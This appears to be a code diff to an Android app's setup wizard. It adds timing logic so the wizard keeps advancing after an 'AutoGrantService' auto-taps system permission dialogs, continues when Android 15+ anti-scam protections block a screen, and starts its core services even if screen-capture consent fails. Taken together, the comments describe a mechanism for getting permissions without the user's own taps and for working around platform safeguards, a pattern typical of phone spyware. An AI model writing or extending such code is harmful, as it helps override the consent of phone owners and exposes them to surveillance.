@@ -5,6 +5,7 @@ import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.content.ContextCompat;
+import androidx.lifecycle.Lifecycle;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
@@ -19,6 +20,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.os.SystemClock;
 import android.provider.Settings;
@@ -87,6 +89,23 @@ public class MainActivity extends AppCompatActivity {
     // system screen, so the flow never opens the same screen twice.
     private static final long LAUNCH_TRANSITION_MS = 400L;
 
+    // When AutoGrantService auto-taps a system dialog, the dialog closes
+    // INSIDE the launch-transition window, so no onResume ever marks the
+    // return. A delayed fallback advances the flow shortly after the launch
+    // if no real resume arrived (the stage re-checks its condition, so an
+    // un-granted stage simply re-opens its screen).
+    private static final long LAUNCH_FALLBACK_MS = 900L;
+    private final Handler setupHandler = new Handler(Looper.getMainLooper());
+    private final Runnable launchFallback = () -> {
+        // Only advance while the activity is at least STARTED: advancing into
+        // the permission / screen-capture stages calls an ActivityResultLauncher
+        // which crashes when the activity is paused behind another window.
+        if (awaitingResume && getLifecycle().getCurrentState().isAtLeast(Lifecycle.State.STARTED)) {
+            awaitingResume = false;
+            advanceSetup();
+        }
+    };
+
     // Screen-launching stages are allowed a few attempts; if a system screen
     // is unreachable/blocked (e.g. Android 15+ anti-scam protections), the
     // wizard gives up on that stage and continues so the service still starts.
@@ -136,6 +155,7 @@ public class MainActivity extends AppCompatActivity {
                 return;
             }
             awaitingResume = false;
+            setupHandler.removeCallbacks(launchFallback);
             advanceSetup();
         }
     }
@@ -144,6 +164,15 @@ public class MainActivity extends AppCompatActivity {
     private void markScreenLaunched() {
         awaitingResume = true;
         lastScreenLaunchAt = SystemClock.elapsedRealtime();
+        // Fallback for dialogs AutoGrantService auto-taps within the launch
+        // transition: no onResume will follow, so advance once the window
+        // passes. A real return clears the pending run in onResume().
+        // Re-armed on EVERY launch: when a stage retries (its screen was
+        // re-launched without a return event), the fallback must fire again or
+        // the wizard stalls forever. Dialog stacking is bounded by
+        // MAX_STAGE_ATTEMPTS (3 per stage).
+        setupHandler.removeCallbacks(launchFallback);
+        setupHandler.postDelayed(launchFallback, LAUNCH_FALLBACK_MS);
     }
 
     /** Bump the attempt counter for a stage; true if it may launch one more time. */
@@ -288,7 +317,14 @@ public class MainActivity extends AppCompatActivity {
                     MediaProjectionManager mpm = (MediaProjectionManager)
                             getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                     if (mpm != null) {
-                        screenCaptureLauncher.launch(mpm.createScreenCaptureIntent());
+                        try {
+                            screenCaptureLauncher.launch(mpm.createScreenCaptureIntent());
+                        } catch (Exception e) {
+                            // Launcher refused (e.g. activity not started);
+                            // start the core services anyway — the consent is
+                            // optional and can be re-requested on relaunch.
+                            startCoreServices();
+                        }
                     } else {
                         startCoreServices();
                     }
